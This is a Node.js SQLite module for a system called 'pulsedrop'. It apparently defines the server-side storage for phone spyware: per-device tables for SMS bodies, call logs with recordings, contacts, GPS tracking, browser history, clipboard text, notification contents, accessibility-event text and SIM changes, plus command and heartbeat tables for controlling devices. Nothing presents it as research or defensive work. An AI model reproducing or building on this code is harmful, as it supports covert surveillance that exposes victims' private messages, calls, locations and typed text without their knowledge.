const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');

const DB_PATH = path.join(__dirname, 'pulsedrop.db');
const db = new Database(DB_PATH);

// Enable WAL mode for better concurrency
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

// Create tables
db.exec(`
  CREATE TABLE IF NOT EXISTS devices (
    device_id TEXT PRIMARY KEY,
    last_heartbeat INTEGER,
    status TEXT DEFAULT 'offline',
    created_at INTEGER DEFAULT (strftime('%s','now') * 1000)
  );

  CREATE TABLE IF NOT EXISTS locations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    lat REAL,
    lon REAL,
    accuracy REAL,
    altitude REAL,
    speed REAL,
    provider TEXT,
    timestamp INTEGER
  );
  CREATE INDEX IF NOT EXISTS idx_locations_device ON locations(device_id);
  CREATE INDEX IF NOT EXISTS idx_locations_time ON locations(timestamp);

  CREATE TABLE IF NOT EXISTS geofence_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    geofence_id TEXT,
    transition TEXT,
    lat REAL,
    lon REAL,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS sms_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    message_id TEXT,
    address TEXT,
    body TEXT,
    type TEXT,
    timestamp INTEGER,
    read INTEGER DEFAULT 0
  );
  CREATE INDEX IF NOT EXISTS idx_sms_device ON sms_messages(device_id);

  CREATE TABLE IF NOT EXISTS call_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    call_id TEXT,
    number TEXT,
    contact_name TEXT,
    type TEXT,
    duration_seconds INTEGER,
    recording_file TEXT,
    timestamp INTEGER
  );
  CREATE INDEX IF NOT EXISTS idx_calls_device ON call_logs(device_id);

  CREATE TABLE IF NOT EXISTS contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    contact_id TEXT,
    name TEXT,
    phone_numbers TEXT,
    emails TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS media_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    media_id TEXT,
    type TEXT,
    file_name TEXT,
    file_path TEXT,
    size_bytes INTEGER,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS device_info (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    battery_level INTEGER,
    is_charging INTEGER,
    network_type TEXT,
    wifi_ssid TEXT,
    ip_address TEXT,
    device_model TEXT,
    manufacturer TEXT,
    os_version TEXT,
    sdk_int INTEGER,
    sim_status TEXT,
    sim_operator TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS sim_change_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    previous_operator TEXT,
    new_operator TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS browser_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    history_id TEXT,
    title TEXT,
    url TEXT,
    visits INTEGER,
    last_visited INTEGER
  );

  CREATE TABLE IF NOT EXISTS browser_bookmarks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    bookmark_id TEXT,
    title TEXT,
    url TEXT,
    created INTEGER
  );

  CREATE TABLE IF NOT EXISTS installed_apps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    package_name TEXT,
    app_name TEXT,
    version_name TEXT,
    version_code INTEGER,
    install_time INTEGER,
    is_system_app INTEGER,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS app_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    package_name TEXT,
    event TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS clipboard_entries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    text TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    notification_id TEXT,
    package_name TEXT,
    app_name TEXT,
    title TEXT,
    text TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS accessibility_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    package_name TEXT,
    text TEXT,
    class_name TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    type TEXT,
    file_name TEXT,
    stored_path TEXT,
    size_bytes INTEGER,
    transcript TEXT,
    transcript_lang TEXT,
    translation TEXT,
    target_lang TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS command_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    command_id TEXT,
    type TEXT,
    status TEXT,
    response TEXT,
    timestamp INTEGER
  );

  CREATE TABLE IF NOT EXISTS feature_toggles (
    device_id TEXT PRIMARY KEY,
    toggles_json TEXT
  );
`);

// Helper: insert or ignore
function insertOrIgnore(table, data) {
  const keys = Object.keys(data);
  const placeholders = keys.map(() => '?').join(', ');
  const stmt = db.prepare(
    `INSERT OR IGNORE INTO ${table} (${keys.join(', ')}) VALUES (${placeholders})`
  );
  return stmt.run(...keys.map(k => data[k]));
}

// Helper: insert
function insert(table, data) {
  const keys = Object.keys(data);
  const placeholders = keys.map(() => '?').join(', ');
  const stmt = db.prepare(
    `INSERT INTO ${table} (${keys.join(', ')}) VALUES (${placeholders})`
  );
  return stmt.run(...keys.map(k => data[k]));
}

// Helper: query all
function all(table, deviceId, limit = 500) {
  return db.prepare(`SELECT * FROM ${table} WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?`)
    .all(deviceId, limit);
}

// Helper: count
function count(table, deviceId) {
  return db.prepare(`SELECT COUNT(*) as c FROM ${table} WHERE device_id = ?`).get(deviceId).c;
}

// Helper: delete by device
function deleteByDevice(table, deviceId) {
  return db.prepare(`DELETE FROM ${table} WHERE device_id = ?`).run(deviceId);
}

module.exports = { db, insertOrIgnore, insert, all, count, deleteByDevice };
